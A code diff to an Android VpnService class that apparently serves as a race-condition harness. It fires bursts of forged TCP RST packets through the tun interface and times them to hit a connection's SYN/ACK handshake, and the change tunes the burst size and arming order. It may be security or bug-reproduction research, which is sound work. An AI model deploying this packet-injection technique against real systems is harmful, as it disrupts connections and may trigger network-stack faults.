@@ -56,7 +56,7 @@ public class MiniVpn extends VpnService implements Runnable {
     /** Prime stride so consecutive rounds do not reuse a port too soon. */
     static final int SPORT_STRIDE = 997;
     /** Number of RSTs fired per round, kept below the tun tx queue depth. */
-    static final int BURST = 64;
+    static final int BURST = 200;
 
     static volatile String status = "idle";
     static final AtomicLong rounds = new AtomicLong();
@@ -67,8 +67,6 @@ public class MiniVpn extends VpnService implements Runnable {
     /** Hand-off between the client loop and the single persistent RST thread. */
     private final AtomicBoolean armed = new AtomicBoolean(false);
     private volatile int targetSport = 0;
-    private volatile long armNanos = 0;
-    private volatile long delayNanos = 0;
 
     private ParcelFileDescriptor pfd;
     private FileOutputStream fos;
@@ -150,10 +148,6 @@ public class MiniVpn extends VpnService implements Runnable {
                 continue;
             }
             int sport = targetSport;
-            long fireAt = armNanos + delayNanos;
-            while (System.nanoTime() < fireAt) {
-                // spin: the interesting window is only a few microseconds wide
-            }
             byte[] pkt = buildRst(sport);
             for (int k = 0; k < BURST; k++) {
                 try {
@@ -172,16 +166,27 @@ public class MiniVpn extends VpnService implements Runnable {
             i++;
 
             int sport = SPORT_BASE + ((i * SPORT_STRIDE) % SPORT_RANGE);
-            targetSport = sport;
-            // Sweep the arrival delay across the SYN -> ACK gap.
-            delayNanos = ((long) (i % 20)) * 30000L;
-            armNanos = System.nanoTime();
-            armed.set(true);
 
             Socket c = new Socket();
             try {
                 c.setReuseAddress(true);
                 c.bind(new InetSocketAddress(InetAddress.getByName(IP), sport));
+            } catch (Throwable t) {
+                errCount.incrementAndGet();
+                closeQuiet(c);
+                continue;
+            }
+
+            /*
+             * Arm before connect, not after. Creating the socket and binding it
+             * costs a few hundred microseconds, which is the same order as the
+             * whole handshake, so arming first is what lets the RST stream
+             * already be in flight when the SYN goes out.
+             */
+            targetSport = sport;
+            armed.set(true);
+
+            try {
                 c.connect(new InetSocketAddress(IP, PORT), 100);
                 okCount.incrementAndGet();
             } catch (Throwable t) {
@@ -190,6 +195,13 @@ public class MiniVpn extends VpnService implements Runnable {
                 closeQuiet(c);
             }
             rounds.incrementAndGet();
+
+            if ((i % 200) == 0) {
+                Log.i(TAG, "rounds=" + rounds.get()
+                        + " ok=" + okCount.get()
+                        + " rst=" + rstCount.get()
+                        + " err=" + errCount.get());
+            }
         }
     }
 
